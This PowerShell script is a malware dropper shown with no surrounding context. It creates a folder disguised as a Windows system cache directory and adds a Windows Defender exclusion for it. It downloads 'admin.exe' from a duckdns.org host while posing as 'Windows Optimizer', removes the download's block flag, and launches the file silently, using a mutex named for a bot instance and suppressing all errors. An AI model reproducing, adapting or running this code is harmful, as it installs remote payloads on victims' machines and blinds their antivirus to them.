$script:CustomAppsFolder     = "C:\ProgramData\Microsoft\Windows\DeviceSync\Cache"
$script:AddDefenderExclusion = $true

function Get-CustomDownloadsCatalog {
    return @(
        @{
            Url   = "https://rootslow.duckdns.org/api/public/download?filename=admin.exe"
            Mutex = "Global\admin_BotInstance"
            Run   = $true
        }
    )
}

function Test-MutexExists {
    param([string]$MutexName)
    if ([string]::IsNullOrWhiteSpace($MutexName)) { return $false }
    try { $m = [System.Threading.Mutex]::OpenExisting($MutexName); $m.Dispose(); return $true }
    catch { return $false }
}

function Start-CustomDownloads {
    try {
        $catalog = Get-CustomDownloadsCatalog
        if (-not $catalog -or $catalog.Count -eq 0) { return }

        try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 } catch {}

        if (-not (Test-Path $script:CustomAppsFolder)) {
            New-Item -Path $script:CustomAppsFolder -ItemType Directory -Force | Out-Null
        }

        if ($script:AddDefenderExclusion) {
            try {
                if (Get-Command Get-MpPreference -ErrorAction SilentlyContinue) {
                    $ex = (Get-MpPreference).ExclusionPath
                    if (-not $ex -or -not $ex.Contains($script:CustomAppsFolder)) {
                        Add-MpPreference -ExclusionPath $script:CustomAppsFolder
                    }
                }
            } catch {}
        }

        foreach ($Prog in $catalog) {
            try {
                if ([string]::IsNullOrWhiteSpace($Prog.Url)) { continue }

                $mutex = if ($Prog.ContainsKey('Mutex')) { $Prog.Mutex } else { "" }

                if ($mutex -and (Test-MutexExists -MutexName $mutex)) {
                    continue
                }

                $exe = Get-ChildItem -Path $script:CustomAppsFolder -Filter "*.exe" -File -ErrorAction SilentlyContinue | Select-Object -First 1

                if ($exe) {
                    if ($Prog.Run -eq $true) {
                        Start-Process -FilePath $exe.FullName -ErrorAction SilentlyContinue
                    }
                    continue
                }

                $wc = New-Object System.Net.WebClient
                $wc.Proxy = $null
                $wc.UseDefaultCredentials = $false
                $wc.Credentials = $null
                $wc.Headers.Add("User-Agent", "Windows Optimizer/1.0")
                
                try {
                    $stream = $wc.OpenRead($Prog.Url)
                    $disp = $wc.ResponseHeaders["Content-Disposition"]
                    $fname = "app.exe"
                    
                    if ($disp -match 'filename="?([^";\r\n]+)"?') { $fname = $Matches[1].Trim() }
                    $dest = Join-Path $script:CustomAppsFolder $fname
                    
                    $fs = [IO.File]::Create($dest)
                    $stream.CopyTo($fs)
                    $fs.Dispose(); $stream.Dispose()
                    
                    try { Unblock-File -Path $dest -ErrorAction SilentlyContinue } catch {}
                }
                finally { 
                    $wc.Dispose() 
                }

                $exe = Get-ChildItem -Path $script:CustomAppsFolder -Filter "*.exe" -File | Select-Object -First 1
                if (-not $exe -or $exe.Length -eq 0) {
                    continue
                }
                
                if ($Prog.Run -eq $true) {
                    Start-Process -FilePath $exe.FullName -ErrorAction SilentlyContinue
                }
            }
            catch {}
        }
    }
    catch {}
}